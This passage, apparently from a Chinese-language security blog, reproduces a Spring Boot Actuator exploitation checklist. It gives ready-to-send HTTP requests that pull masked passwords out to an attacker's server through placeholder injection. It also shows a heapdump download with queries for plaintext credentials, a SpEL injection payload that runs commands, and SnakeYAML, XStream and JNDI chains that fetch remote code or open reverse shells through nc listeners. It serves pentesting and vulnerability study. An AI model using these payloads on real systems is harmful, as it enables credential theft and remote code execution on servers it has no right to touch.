class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> </span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://value:$&#123;security.user.password&#125;@your-vps-ip</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:$&#123;security.user.password&#125;@your-vps-ip&quot;&#125;</span><br></pre></td></tr></table></figure><h5 id="步骤四：-刷新配置"><a href="#步骤四：-刷新配置" class="headerlink" title="步骤四： 刷新配置"></a>步骤四： 刷新配置</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><h5 id="步骤五：-解码属性值"><a href="#步骤五：-解码属性值" class="headerlink" title="步骤五： 解码属性值"></a>步骤五： 解码属性值</h5><p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code> 头内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic dmFsdWU6MTIzNDU2</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 * 脱敏前的属性值明文。</p><h3 id="0x05：获取被星号脱敏的密码的明文-方法三"><a href="#0x05：获取被星号脱敏的密码的明文-方法三" class="headerlink" title="0x05：获取被星号脱敏的密码的明文 (方法三)"></a>0x05：获取被星号脱敏的密码的明文 (方法三)</h3><h4 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>通过 POST <code>/env</code> 设置属性触发目标对外网指定地址发起任意 http 请求</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><h4 id="利用方法：-2"><a href="#利用方法：-2" class="headerlink" title="利用方法："></a>利用方法：</h4><blockquote><p>参考 UUUUnotfound 提出的 <a href="https://github.com/LandGrey/SpringBootVulExploit/issues/1">issue-1</a>，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据</p></blockquote><h5 id="步骤一：-找到想要获取的属性名-2"><a href="#步骤一：-找到想要获取的属性名-2" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p><h5 id="步骤二：-使用-nc-监听-HTTP-请求-1"><a href="#步骤二：-使用-nc-监听-HTTP-请求-1" class="headerlink" title="步骤二： 使用 nc 监听 HTTP 请求"></a>步骤二： 使用 nc 监听 HTTP 请求</h5><p>在自己控制的外网服务器上监听 80 端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvk 80</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="步骤三：-触发对外-http-请求"><a href="#步骤三：-触发对外-http-请求" class="headerlink" title="步骤三： 触发对外 http 请求"></a>步骤三： 触发对外 http 请求</h5><ul><li><code>spring.cloud.bootstrap.location</code> 方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）</li></ul><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> </span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip/?=$&#123;security.user.password&#125;</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/?=$&#123;security.user.password&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><ul><li><code>eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）</li></ul><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> </span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/$&#123;security.user.password&#125;</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/$&#123;security.user.password&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><h5 id="步骤四：-刷新配置-1"><a href="#步骤四：-刷新配置-1" class="headerlink" title="步骤四： 刷新配置"></a>步骤四： 刷新配置</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><h3 id="0x06：获取被星号脱敏的密码的明文-方法四"><a href="#0x06：获取被星号脱敏的密码的明文-方法四" class="headerlink" title="0x06：获取被星号脱敏的密码的明文 (方法四)"></a>0x06：获取被星号脱敏的密码的明文 (方法四)</h3><blockquote><p>访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p></blockquote><h4 id="利用条件：-3"><a href="#利用条件：-3" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可正常 GET 请求目标 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口</li></ul><h4 id="利用方法：-3"><a href="#利用方法：-3" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名-3"><a href="#步骤一：-找到想要获取的属性名-3" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p><h5 id="步骤二：-下载-jvm-heap-信息"><a href="#步骤二：-下载-jvm-heap-信息" class="headerlink" title="步骤二： 下载 jvm heap 信息"></a>步骤二： 下载 jvm heap 信息</h5><blockquote><p>下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G</p></blockquote><p><code>GET</code> 请求目标的 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口，下载应用实时的 JVM 堆信息</p><h5 id="步骤三：-使用-MAT-获得-jvm-heap-中的密码明文"><a href="#步骤三：-使用-MAT-获得-jvm-heap-中的密码明文" class="headerlink" title="步骤三： 使用 MAT 获得 jvm heap 中的密码明文"></a>步骤三： 使用 MAT 获得 jvm heap 中的密码明文</h5><p>参考 <a href="https://landgrey.me/blog/16/">文章</a> 方法，使用 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具的 <strong>OQL</strong> 语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br><span class="line"> </span><br><span class="line">或</span><br><span class="line"> </span><br><span class="line">select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure><p>辅助用 “<strong>password</strong>“ 等关键词快速过滤分析，获得密码等相关敏感信息的明文。</p><h2 id="二：远程代码执行"><a href="#二：远程代码执行" class="headerlink" title="二：远程代码执行"></a>二：远程代码执行</h2><blockquote><p>由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准</p></blockquote><h3 id="0x01：whitelabel-error-page-SpEL-RCE"><a href="#0x01：whitelabel-error-page-SpEL-RCE" class="headerlink" title="0x01：whitelabel error page SpEL RCE"></a>0x01：whitelabel error page SpEL RCE</h3><h4 id="利用条件：-4"><a href="#利用条件：-4" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li><li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li></ul><h4 id="利用方法：-4"><a href="#利用方法：-4" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：找到一个正常传参处"><a href="#步骤一：找到一个正常传参处" class="headerlink" title="步骤一：找到一个正常传参处"></a>步骤一：找到一个正常传参处</h5><p>比如发现访问 <code>/article?id=xxx</code> ，页面会报状态码为 500 的错误： <code>Whitelabel Error Page</code>，则后续 payload 都将会在参数 id 处尝试。</p><h5 id="步骤二：执行-SpEL-表达式"><a href="#步骤二：执行-SpEL-表达式" class="headerlink" title="步骤二：执行 SpEL 表达式"></a>步骤二：执行 SpEL 表达式</h5><p>输入 <code>/article?id=$&#123;7*7&#125;</code> ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p><p>由字符串格式转换成 <code>0x**</code> java 字节形式，方便执行任意代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"> </span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;open -a Calculator&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure><p>执行 <code>open -a Calculator</code> 命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x6f</span>,<span class="number">0x70</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x20</span>,<span class="number">0x2d</span>,<span class="number">0x61</span>,<span class="number">0x20</span>,<span class="number">0x43</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>&#125;))&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h4 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li><li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li><li>其中 <code>$&#123;&#125;</code> 包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li></ol><h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p> <a href="https://www.cnblogs.com/litlife/p/10183137.html">SpringBoot SpEL表达式注入漏洞-分析与复现</a></p><h4 id="漏洞环境："><a href="#漏洞环境：" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce">repository&#x2F;springboot-spel-rce</a></p><p>正常访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9091/article?id=66</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>执行 <code>open -a Calculator</code> 命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:9091/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72&#125;))&#125;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="0x02：spring-cloud-SnakeYAML-RCE"><a href="#0x02：spring-cloud-SnakeYAML-RCE" class="headerlink" title="0x02：spring cloud SnakeYAML RCE"></a>0x02：spring cloud SnakeYAML RCE</h3><h4 id="利用条件：-5"><a href="#利用条件：-5" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><h4 id="利用方法：-5"><a href="#利用方法：-5" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-托管-yml-和-jar-文件"><a href="#步骤一：-托管-yml-和-jar-文件" class="headerlink" title="步骤一： 托管 yml 和 jar 文件"></a>步骤一： 托管 yml 和 jar 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"> </span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在网站根目录下放置后缀为 <code>yml</code> 的文件 <code>example.yml</code>，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://your-vps-ip/example.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在网站根目录下放置后缀为 <code>jar</code> 的文件 <code>example.jar</code>，内容是要执行的代码，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a>。</p><h5 id="步骤二：-设置-spring-cloud-bootstrap-location-属性"><a href="#步骤二：-设置-spring-cloud-bootstrap-location-属性" class="headerlink" title="步骤二： 设置 spring.cloud.bootstrap.location 属性"></a>步骤二： 设置 spring.cloud.bootstrap.location 属性</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> </span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip/example.yml</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;&#125;</span><br></pre></td></tr></table></figure><h5 id="步骤三：-刷新配置"><a href="#步骤三：-刷新配置" class="headerlink" title="步骤三： 刷新配置"></a>步骤三： 刷新配置</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><h4 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li><li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li><li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li><li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li><li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li><li>实例化类时执行恶意代码，造成 RCE 漏洞</li></ol><h4 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p> <a href="https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/">Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记</a></p><h4 id="漏洞环境：-1"><a href="#漏洞环境：-1" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce">repository&#x2F;springcloud-snakeyaml-rce</a></p><p>正常访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9092/env</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="0x03：eureka-xstream-deserialization-RCE"><a href="#0x03：eureka-xstream-deserialization-RCE" class="headerlink" title="0x03：eureka xstream deserialization RCE"></a>0x03：eureka xstream deserialization RCE</h3><h4 id="利用条件：-6"><a href="#利用条件：-6" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标使用的 <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><h4 id="利用方法：-6"><a href="#利用方法：-6" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：架设响应恶意-XStream-payload-的网站"><a href="#步骤一：架设响应恶意-XStream-payload-的网站" class="headerlink" title="步骤一：架设响应恶意 XStream payload 的网站"></a>步骤一：架设响应恶意 XStream payload 的网站</h5><p>提供一个依赖 Flask 并符合要求的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p><p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p><h5 id="步骤二：监听反弹-shell-的端口"><a href="#步骤二：监听反弹-shell-的端口" class="headerlink" title="步骤二：监听反弹 shell 的端口"></a>步骤二：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="步骤三：设置-eureka-client-serviceUrl-defaultZone-属性"><a href="#步骤三：设置-eureka-client-serviceUrl-defaultZone-属性" class="headerlink" title="步骤三：设置 eureka.client.serviceUrl.defaultZone 属性"></a>步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> </span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;&#125;</span><br></pre></td></tr></table></figure><h5 id="步骤四：刷新配置"><a href="#步骤四：刷新配置" class="headerlink" title="步骤四：刷新配置"></a>步骤四：刷新配置</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><h4 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li><li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li><li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li></ol><h4 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p> <a href="https://www.freebuf.com/column/234719.html">Spring Boot Actuator从未授权访问到getshell</a></p><h4 id="漏洞环境：-2"><a href="#漏洞环境：-2" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-eureka-xstream-rce">repository&#x2F;springboot-eureka-xstream-rce</a></p><p>正常访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9093/env</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="0x04：jolokia-logback-JNDI-RCE"><a href="#0x04：jolokia-logback-JNDI-RCE" class="headerlink" title="0x04：jolokia logback JNDI RCE"></a>0x04：jolokia logback JNDI RCE</h3><h4 id="利用条件：-7"><a href="#利用条件：-7" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</li></ul><h4 id="利用方法：-7"><a href="#利用方法：-7" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看已存在的-MBeans"><a href="#步骤一：查看已存在的-MBeans" class="headerlink" title="步骤一：查看已存在的 MBeans"></a>步骤一：查看已存在的 MBeans</h5><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p><h5 id="步骤二：托管-xml-文件"><a href="#步骤二：托管-xml-文件" class="headerlink" title="步骤二：托管 xml 文件"></a>步骤二：托管 xml 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"> </span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code> 文件，内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;ldap://your-vps-ip:1389/JNDIObject&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="步骤三：准备要执行的-Java-代码"><a href="#步骤三：准备要执行的-Java-代码" class="headerlink" title="步骤三：准备要执行的 Java 代码"></a>步骤三：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a> <code>JNDIObject.java</code>，</p><p>使用兼容低版本 jdk 的方式编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javac -<span class="built_in">source</span> 1.5 -target 1.5 JNDIObject.java</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p><h5 id="步骤四：架设恶意-ldap-服务"><a href="#步骤四：架设恶意-ldap-服务" class="headerlink" title="步骤四：架设恶意 ldap 服务"></a>步骤四：架设恶意 ldap 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 